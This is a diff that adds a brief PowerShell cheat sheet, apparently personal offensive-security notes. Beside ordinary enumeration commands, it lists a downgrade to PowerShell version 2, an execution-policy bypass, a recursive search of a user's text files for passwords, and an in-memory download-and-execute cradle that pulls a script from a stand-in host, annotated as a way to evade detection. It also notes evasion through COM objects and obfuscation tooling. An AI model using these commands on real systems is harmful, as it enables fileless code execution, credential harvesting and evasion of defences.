@@ -1,0 +1,18 @@
+Get-Help * Useful *
+[Environment]::Is64BitProcess
+filters :  
+	Select-Object
+	Format-List
+	sort -u   
+Powershell -Version 2 
+Powershell -ExecutionPolicy bypass (Or restricted)	
+Get-Process |sort -u | Select-Object Name, path
+ls -r C:\Users\SadUser\ -File *.txt | % {sls -path $_ -pattern pass*} 
+$ENV:PsModulePath
+Get-Service | ? {$_.Status -Match 'Running'}
+Get-Service | ForEach-Object {$_.Name} or % {$_.Name}
+iex (New-Object Net.WebClient).DownloadString("http://sad.com/sad.ps1") ==> 
+													to run commands in powershell memory without downloading script to disk
+													we can use a different extension for evasion and it will still run as a ps1 script
+System.Xml.XmlDocument ==> evasion using COM objects
+Invoke-Obfuscation ==> nice tool 
